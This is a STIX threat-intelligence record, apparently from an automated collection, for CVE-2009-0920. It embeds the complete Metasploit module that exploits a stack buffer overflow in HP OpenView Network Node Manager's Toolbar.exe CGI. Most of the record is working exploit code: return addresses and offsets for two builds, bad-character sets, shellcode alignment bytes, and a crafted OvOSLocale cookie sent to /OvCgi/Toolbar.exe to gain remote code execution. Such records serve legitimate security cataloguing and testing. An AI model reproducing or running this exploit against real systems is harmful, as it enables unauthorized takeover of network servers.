{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c8fea84e-46e8-4d29-be65-b8e723f80a1e",
    "created": "2024-08-14T16:52:19.102845Z",
    "modified": "2024-08-14T16:52:19.102849Z",
    "name": "HP OpenView Network Node Manager Toolbar.exe CGI Cookie Handling Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.0 and 7.53.  By sending a CGI request with a specially OvOSLocale cookie to Toolbar.exe, an attacker may be able to execute arbitrary code.  Please note that this module only works against a specific build (i.e. NNM 7.53_01195)  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_toolbar_02.rb",
            "external_id": "hp_nnm_toolbar_02.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0920"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/openview-buffer-overflows"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager Toolbar.exe CGI Cookie Handling Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.0\n        and 7.53.  By sending a CGI request with a specially OvOSLocale cookie to Toolbar.exe, an\n        attacker may be able to execute arbitrary code.  Please note that this module only works\n        against a specific build (i.e. NNM 7.53_01195)\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Oren Isacson', # original discovery\n          'juan vazquez', # metasploit module (7.0 target)\n          'sinn3r',       # 7.53_01195 target\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0920' ],\n          [ 'OSVDB', '53242' ],\n          [ 'BID', '34294' ],\n          [ 'URL', 'http://www.coresecurity.com/content/openview-buffer-overflows']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'          => 4000,\n          'BadChars'       => \"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x7f\\x3b\\x2b\",\n          'DisableNops'    => true, # no need\n          'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,\n          'EncoderOptions' =>\n          {\n            'BufferRegister' => 'EDX'\n          }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            #Windows XP SP3\n            'HP OpenView Network Node Manager Release B.07.00',\n            {\n              'Ret' => 0x5A212147, # ovsnmp.dll call esp\n              'Offset' => 0xFC,  # until EIP\n              # Pointer to string with length < 0x100\n              # Avoid crash before vulnerable function returns\n              # And should work as a \"NOP\" since it will prepend shellcode\n              #'ReadAddress' => 0x5A03A225,# ov.dll\n              'ReadAddress' => 0x5A03A225,# ov.dll\n              'EDXAdjust' => 0x17,\n              # 0x8 => offset until \"0x90\" nops\n              # 0x4 => \"0x90\" nops\n              # 0x2 => len(push esp, pop edx)\n              # 0x3 => len(sub)\n              # 0x6 => len(add)\n            }\n          ],\n          [\n            #Windows Server 2003\n            'HP OpenView Network Node Manager 7.53 Patch 01195',\n            {\n              'Eax'       => 0x5a456eac,   #Readable address for CMP BYTE PTR DS:[EAX],0\n              'EaxOffset' => 251,          #Offset to overwrite EAX\n              'Ret'       => 0x5A23377C,   #CALL EDI\n              'Max'       => 8000,         #Max buffer size\n            }\n          ]\n        ],\n      'DisclosureDate' => '2009-01-21'))\n  end\n\n  def exploit\n\n    if target.name =~ /7\\.53/\n\n      #EDX alignment for alphanumeric shellcode\n      #payload is in EDI first.  We exchange it with EDX, align EDX, and then\n      #jump to it.\n      align  = \"\\x87\\xfa\"      #xchg edi,edx\n      align << \"\\x80\\xc2\\x27\"  #add dl,0x27\n      align << \"\\xff\\xe2\"      #jmp edx\n\n      #Add the alignment code to payload\n      p = align + payload.encoded\n\n      sploit  = 'en_US'\n      sploit << rand_text_alphanumeric(247)\n      sploit << [target.ret].pack('V*')\n      sploit << rand_text_alphanumeric(target['EaxOffset']-sploit.length+'en_US'.length)\n      sploit << [target['Eax']].pack('V*')\n      sploit << rand_text_alphanumeric(3200)\n      sploit << make_nops(100 - align.length)\n      sploit << align\n      sploit << p\n      sploit << rand_text_alphanumeric(target['Max']-sploit.length)\n\n    elsif target.name =~ /B\\.07\\.00/\n\n      edx = Rex::Arch::X86::EDX\n\n      sploit = \"en_US\"\n      sploit << rand_text_alphanumeric(target['Offset'] - \"en_US\".length, payload_badchars)\n      sploit << [target.ret].pack('V')\n      sploit << [target['ReadAddress']].pack('V')\n      sploit << \"\\x90\\x90\\x90\\x90\"\n      # Get in EDX a pointer to the shellcode start\n      sploit << \"\\x54\" # push esp\n      sploit << \"\\x5A\" # pop edx\n      sploit << Rex::Arch::X86.sub(-(target['EDXAdjust']), edx, payload_badchars, false, true)\n      sploit << \"\\x81\\xc4\\x48\\xf4\\xff\\xff\" # add esp, -3000\n      sploit << payload.encoded\n\n    end\n\n    #Send the malicious request to /OvCgi/ToolBar.exe\n    #If the buffer contains a badchar, NNM 7.53 will return a \"400 Bad Request\".\n    #If the exploit causes ToolBar.exe to crash, NNM returns \"error in CGI Application\"\n    send_request_raw({\n      'uri'     => \"/OvCgi/Toolbar.exe\",\n      'method'  => \"GET\",\n      'cookie'  => \"OvOSLocale=\" + sploit + \"; OvAcceptLang=en-usa\",\n    }, 20)\n\n    handler\n    disconnect\n  end\nend\n\n\n=begin\nNNM B.07.00's badchar set:\n00 0D 0A 20 3B 3D 2C 2B\n\nNNM 7.53_01195's badchar set:\n01 02 03 04 05 06 07 08 0a 0b 0c 0d 0e 0f 10 11    ................\n12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 7f       ...............\n3b = delimiter\n2b = gets converted to 0x2b\n=end\n",
    "x_mitre_disclosure_date": "2009-01-21",
    "x_mitre_platforms": [
        "win'"
    ]
}